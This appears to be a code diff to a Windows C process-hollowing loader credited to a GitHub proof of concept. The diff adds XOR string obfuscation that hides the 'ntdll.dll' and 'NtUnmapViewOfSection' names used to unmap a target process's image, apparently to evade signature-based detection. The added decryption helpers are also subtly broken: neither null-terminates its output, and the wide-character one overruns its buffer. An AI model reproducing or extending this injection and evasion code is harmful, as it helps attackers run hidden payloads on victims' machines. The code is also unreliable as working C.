@@ -1,9 +1,29 @@
 #include <stdio.h>
 #include <windows.h>
 // https://github.com/jbremer/godware/blob/1b49b39c2aed005867c81982e2dd5b59400b581b/poc2.c
-
+byte *decrypted(byte *data, int length, int crytptkey);
+WCHAR *widedecrypt(byte *data, int length, int crytptkey);
 typedef LONG (WINAPI *LP_NtUnmapViewOfSection)(HANDLE ProcessHandle,
     DWORD BaseAddress);
+
+byte *decrypted(byte *data, int length, int crytptkey)
+{	
+	byte *out = (byte*)malloc(length+1);
+	for(int x=0;x < length;x++)
+	{
+	out[x] = data[x] ^ crytptkey; 
+	}
+	return out;
+}
+WCHAR *widedecrypt(byte *data, int length, int crytptkey)
+{	
+	WCHAR *out = (WCHAR*)malloc(length+1);
+	for(int x=0;x < length;x++)
+	{
+	out[x] = data[x] ^ crytptkey; 
+	}
+	return out;
+}
 int ExecFile(const char *pszFilePath, byte *lpFile)
 {
 
@@ -46,7 +66,7 @@ int ExecFile(const char *pszFilePath, byte *lpFile)
     if(dwImageBase == pImageNtHeaders->OptionalHeader.ImageBase) {
         LP_NtUnmapViewOfSection pNtUnmapViewOfSection =
             (LP_NtUnmapViewOfSection) GetProcAddress(
-                GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
+                GetModuleHandleA(decrypted("cyiaa#iaa",9,13)), decrypted("@z[`co~XgkyAh]kmzga`",20,14)); // NtUnmapViewOfSection,20,14 || ntdll.dll,9,13
         pNtUnmapViewOfSection(ProcessInformation.hProcess, dwImageBase);
     }
 
